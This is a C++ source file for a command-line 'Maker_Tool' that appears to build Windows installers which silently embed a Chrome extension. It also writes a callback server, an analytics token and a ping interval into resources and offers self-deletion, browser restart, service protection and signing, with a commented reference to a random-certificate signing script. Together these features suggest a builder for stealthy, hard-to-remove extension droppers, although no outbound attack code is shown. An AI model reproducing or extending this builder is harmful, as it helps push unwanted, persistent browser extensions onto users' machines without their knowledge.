// Maker_Tool.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include "ZipUtil.h"
#include <windows.h>
#include <fstream>
#include <vector>
#include "ProcessUtil.h"
#include "MyDefine.h"



// Function to load binary data from a file
std::vector<char> LoadBinaryFile(const std::wstring& filePath) {
    std::ifstream file(filePath, std::ios::binary);
    return std::vector<char>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
}
// Function to convert struct to vector<char>
std::vector<char> ConvertStructToVector(const INSTALLER_INFO& info) {
    // Calculate the size of the struct
    size_t structSize = sizeof(INSTALLER_INFO);
    // Create a vector of char with the size of the struct
    std::vector<char> buffer(structSize);
    // Copy the raw memory of the struct to the vector
    std::memcpy(buffer.data(), &info, structSize);
    return buffer;
}
//
//void SetFolderInPath(const std::wstring& folderPath) {
//    // Get the size of the current PATH environment variable
//    DWORD bufferSize = GetEnvironmentVariableW(L"PATH", NULL, 0);
//    if (bufferSize == 0) {
//        std::cerr << "Failed to get the size of the PATH environment variable." << std::endl;
//        return;
//    }
//
//    // Allocate a buffer to hold the current PATH value
//    std::wstring path(bufferSize, L'\0');
//    if (GetEnvironmentVariableW(L"PATH", &path[0], bufferSize) == 0) {
//        std::cerr << "Failed to get the PATH environment variable." << std::endl;
//        return;
//    }
//
//    // Remove the null terminator added by GetEnvironmentVariableW
//    path.resize(bufferSize - 1);
//
//    // Check if the folder path is already in the PATH variable
//    if (path.find(folderPath) == std::wstring::npos) {
//        // Append the new folder path to the PATH variable
//        if (!path.empty() && path.back() != L';') {
//            path += L";";
//        }
//        path += folderPath;
//
//        // Set the updated PATH variable
//        if (SetEnvironmentVariableW(L"PATH", path.c_str()) == 0) {
//            std::cerr << "Failed to set the PATH environment variable." << std::endl;
//        }
//        else {
//            std::cout << "Successfully added the folder to the PATH environment variable." << std::endl;
//            std::wcerr << path.c_str() << std::endl;
//        }
//    }
//    else {
//        std::cout << "The folder is already in the PATH environment variable." << std::endl;
//    }
//}

int wmain(int argc, wchar_t* argv[])
{
    
    //. input Param ( IN CRX data, Output folder)
    std::wstring w_strCRXFolder = L"";
    std::wstring w_strCRXCheckFilePath = L"";
    std::wstring w_strCRXZipFilePath = L"";
    std::wstring w_strOutputFolder = L"";
    std::wstring w_strOutputFileName = L"";
    std::wstring w_strInputBaseFileName = L"";
    std::wstring w_strSignToolPath = L"";
    std::wstring w_strFileVersion = L"";
    std::wstring w_strWebServerAddress = L"";
    std::wstring w_strSelfDelOpt = L"";
    std::wstring w_strSelfSign = L"";
    std::wstring w_strRestartBrowser = L"";
    std::wstring w_strProtectService = L"";
    std::wstring w_strAnalyticsServer = L"";
    std::wstring w_strAnalyticsToken = L"";
    std::wstring w_strPingTime = L"";
    std::wstring w_strWebServiceName = L"";



    std::string w_sServerIP = "";
    //std::wstring	w_strStartURL = L"";

    std::wstring        exeDir = GetExecutableDirectory();
    std::wstring	    ZIP_File = L"";
    std::wstring	    CRX_Installer_File = L"";
    std::wstring	    OUT_Installer_File = L"";
    std::wstring	    PS_Script_File = L"";
    TCHAR	            w_szParam[MAX_PATH] = L"";
    SHFILEOPSTRUCT      fileOp = { 0 };
    std::vector<char>   w_data;
    std::vector<char>   w_InstallerInfo;

    int                 w_nRtn = 0;
    size_t              w_PreFileSize = 0;
    size_t              w_AfterFileSize = 0;
    INSTALLER_INFO      w_stINSTALLER_INFO; memset(&w_stINSTALLER_INFO, 0x00, sizeof(INSTALLER_INFO));

    if (argc <= 1) {
        std::cout << "Usage: " << "Maker_Tool.exe " << " -i <base file path> -c <CRX zip file path> -o <output folder> -n <output file name> -s <signtool path> -v <version information> -w <server address> -d < 0 | 1 > -ss < 0 | 1 > -rb < 0 | 1 > -ps < 0 | 1 > -as <Analytics API URL> -at <Analytics Token> -pt <Ping Time> -wsn <web service name>" << std::endl;
        goto L_EXIT;
    }
    // Parse command-line arguments
    for (int i = 1; i < argc; ++i) {
        if (wcscmp(argv[i], L"-c") == 0 && i + 1 < argc) {
            w_strCRXZipFilePath = argv[++i];
        }
        else if (wcscmp(argv[i], L"-o") == 0 && i + 1 < argc) {
            w_strOutputFolder = argv[++i];
        }
        else if (wcscmp(argv[i], L"-n") == 0 && i + 1 < argc) {
            w_strOutputFileName = argv[++i];
        }
        else if (wcscmp(argv[i], L"-i") == 0 && i + 1 < argc) {
            w_strInputBaseFileName = argv[++i];
        }
        else if (wcscmp(argv[i], L"-s") == 0 && i + 1 < argc) {
            w_strSignToolPath = argv[++i];
        }
        else if (wcscmp(argv[i], L"-v") == 0 && i + 1 < argc) {
            w_strFileVersion = argv[++i];
        }
        else if (wcscmp(argv[i], L"-w") == 0 && i + 1 < argc) {
            w_strWebServerAddress = argv[++i];
        }
        else if (wcscmp(argv[i], L"-d") == 0 && i + 1 < argc) {
            w_strSelfDelOpt = argv[++i];
        }
        else if (wcscmp(argv[i], L"-ss") == 0 && i + 1 < argc) {
            w_strSelfSign = argv[++i];
        }
        else if (wcscmp(argv[i], L"-rb") == 0 && i + 1 < argc) {
            w_strRestartBrowser = argv[++i];
        }
        else if (wcscmp(argv[i], L"-ps") == 0 && i + 1 < argc) {
            w_strProtectService = argv[++i];
        }
        else if (wcscmp(argv[i], L"-as") == 0 && i + 1 < argc) {
            w_strAnalyticsServer = argv[++i];
        }
        else if (wcscmp(argv[i], L"-at") == 0 && i + 1 < argc) {
            w_strAnalyticsToken = argv[++i];
        }
        else if (wcscmp(argv[i], L"-pt") == 0 && i + 1 < argc) {
            w_strPingTime = argv[++i];
        }
        else if (wcscmp(argv[i], L"-wsn") == 0 && i + 1 < argc) {
            w_strWebServiceName = argv[++i];
        }
        else {
            std::wcerr << L"Unknown or incomplete argument: " << argv[i] << std::endl;
            std::cout << "Usage: " << "Maker_Tool.exe " << " -i <base file path> -c <CRX zip file path> -o <output folder> -n <output file name> -s <signtool path> -v <version information> -w <server address> -d < 0 | 1 > -ss < 0 | 1 >  -rb < 0 | 1 > -ps < 0 | 1 > -as <Analytics API URL> -at <Analytics Token> -pt <Ping Time> -wsn <web service name>" << std::endl;
            goto L_EXIT;
        }
    }

    //. Init
    if (w_strFileVersion.empty()) {
        w_strFileVersion = L"1.1.0";
    }
    if (w_strSelfDelOpt.empty()) {
        w_strSelfDelOpt = L"0";
    }
    if (w_strSelfDelOpt == L"1") {
        w_strSelfDelOpt = L"delete";
    }
    if (w_strRestartBrowser == L"1") {
        w_stINSTALLER_INFO.m_nRestartBrowser = 1;
    }
    if (w_strProtectService == L"1") {
        w_stINSTALLER_INFO.m_nServiceProtection = 1;
    }
    if (w_strAnalyticsServer.empty() == false) {
        std::string     w_sTemp = SpliteServerAddr(ConvertWStringToString(w_strAnalyticsServer));
        strcpy_s(w_stINSTALLER_INFO.m_szAnalyticsServer, w_sTemp.c_str());
    }
    if (w_strAnalyticsToken.empty() == false) {
        std::string     w_sTemp = ConvertWStringToString(w_strAnalyticsToken);
        strcpy_s(w_stINSTALLER_INFO.m_szAnalyticsToken, w_sTemp.c_str());
    }
    if (w_strPingTime.empty()) {
        w_stINSTALLER_INFO.m_nPingIntervalTime = GD_DEFAULT_PING_TIME;
    }
    else {
        w_stINSTALLER_INFO.m_nPingIntervalTime = std::stoi(w_strPingTime);
    }
    if (w_strWebServiceName.empty()) {
        std::string     w_sTemp = "MyWebSvc";
        strcpy_s(w_stINSTALLER_INFO.m_szWebServiceName, w_sTemp.c_str());
    }
    else {
        std::string     w_sTemp = ConvertWStringToString(w_strWebServiceName);
        strcpy_s(w_stINSTALLER_INFO.m_szWebServiceName, w_sTemp.c_str());
    }

    ZIP_File = exeDir + L"\\data_temp.zip";
    //w_strSignToolPath = exeDir + L"\\signtool.exe";
    CRX_Installer_File = w_strInputBaseFileName;
    OUT_Installer_File = w_strOutputFolder + L"\\" + w_strOutputFileName;
    //PS_Script_File = exeDir + L"\\SignFileWithRandomCert.ps1";
    w_strCRXFolder = exeDir + L"\\temp123\\";
    w_strCRXCheckFilePath = exeDir + L"\\temp123\\manifest.json";

    //. Check Parameter
    if (FileExists(w_strInputBaseFileName.c_str()) == false) {
        std::cerr << "Error ... input file path." << std::endl;
        goto L_EXIT;
    }

    if (w_strCRXZipFilePath.empty() == false) {
        if (FileExists(w_strCRXZipFilePath.c_str()) == false) {
            std::cerr << "Error ... CRX zip file path." << std::endl;
            goto L_EXIT;
        }
        CreateDirectory(w_strCRXFolder.c_str(), NULL);
        MyUnzipFile(ConvertWStringToString(w_strCRXZipFilePath), ConvertWStringToString(w_strCRXFolder));
        //. check manifest.json
        if (FileExists(w_strCRXCheckFilePath.c_str())) {

        }
        else {
            std::cerr << "Error ... there is no manifest.json file in the ZIP file." << std::endl;
            goto L_EXIT;
        }
        //. CRX data to Zip
        MyZipCRXData(w_strCRXFolder, ZIP_File);
        //. Delete Directory
        w_strCRXFolder.append(1, L'\0');
        fileOp.wFunc = FO_DELETE;  // Deletion operation
        fileOp.pFrom = w_strCRXFolder.c_str();
        fileOp.fFlags = FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT; // Flags to suppress UI and confirmation dialogs
        SHFileOperation(&fileOp);
    }

    //. copy file to output folder
    //. Create Directory
    CreateDirectory(w_strOutputFolder.c_str(), NULL);
    //. 
    std::wcerr << L"Src File Path: " << CRX_Installer_File << std::endl;
    std::wcerr << L"Dst File Path: " << OUT_Installer_File << std::endl;

    //. 
//x    CopyFile(CRX_Installer_File.c_str(), OUT_Installer_File.c_str(), FALSE);
    ModContentToFile(ConvertWStringToString(CRX_Installer_File), ConvertWStringToString(OUT_Installer_File));

    if (w_strCRXZipFilePath.empty() == false) {
        //. Insert zip data into Resoure Data
        // Load binary data from file
        w_data = LoadBinaryFile(ZIP_File);
        if (UpdateResourceInExecutable(OUT_Installer_File, w_data, GD_CRX_RESOURCE_ID)) {
        }
        else {
            std::cerr << "Failed to update binary resource.(GD_CRX_RESOURCE_ID)" << std::endl;
            goto L_EXIT;
        }
        //. Delete zip file
        DeleteFile(ZIP_File.c_str());
    }
    //.
    if (w_strWebServerAddress.empty()) {
        w_strWebServerAddress = L"t";
    }
    w_sServerIP = SpliteServerAddr(ConvertWStringToString(w_strWebServerAddress));
    if (UpdateStringResourceInExecutable(OUT_Installer_File, ConvertWStringToString(w_strSelfDelOpt), GD_SELF_DEL_RESOURCE_ID)) {
    }
    else {
        std::cerr << "Failed to update self delete option." << std::endl;
        goto L_EXIT;
    }
    //.
    if (w_strAnalyticsToken.empty() == false) {
        std::string     w_sTemp = w_sServerIP;
        strcpy_s(w_stINSTALLER_INFO.m_szWebServerIPAddr, w_sTemp.c_str());
    }
    w_InstallerInfo = ConvertStructToVector(w_stINSTALLER_INFO);
    if (UpdateResourceInExecutable(OUT_Installer_File, w_InstallerInfo, GD_INSTALLER_INO_RESOURCE_ID)) {
    }
    else {
        std::cerr << "Failed to update binary resource.(GD_INSTALLER_INO_RESOURCE_ID)" << std::endl;
        goto L_EXIT;
    }

    if (UpdateStringResourceInExecutable(OUT_Installer_File, w_sServerIP, GD_SERVER_ADD_RESOURCE_ID)) {
    }
    else {
        std::cerr << "Failed to update server address." << std::endl;
        goto L_EXIT;
    }

    //. Update version 
    if (UpdateStringResourceInExecutable(OUT_Installer_File, ConvertWStringToString(w_strFileVersion), GD_VER_RESOURCE_ID)) {
    }
    else {
        std::cerr << "Failed to update version resource." << std::endl;
        goto L_EXIT;
    }

    if (w_strSelfSign == L"1")
    {
        w_PreFileSize = getFileSize(OUT_Installer_File);
        if (w_PreFileSize <= 0) {
            std::cerr << "Error ... w_PreFileSize == 0." << std::endl;
            goto L_EXIT;
        }
        //. SignTool Starting ... 
        std::cout << "SignTool Starting ... " << std::endl;
        cmd_sign(ConvertWStringToString(OUT_Installer_File), ConvertWStringToString(w_strSignToolPath));

        w_AfterFileSize = getFileSize(OUT_Installer_File);
        if (w_AfterFileSize <= 0) {
            std::cerr << "Error ... w_AfterFileSize == 0." << std::endl;
            goto L_EXIT;
        }
        if (w_AfterFileSize <= w_PreFileSize) {
            std::cerr << "Error ... Failded SignTool ." << std::endl;
            goto L_EXIT;
        }

    }


    std::cout << "OK ... updated successfully." << std::endl;
    //. OK 
    w_nRtn = 1;

L_EXIT:
	return w_nRtn;
}
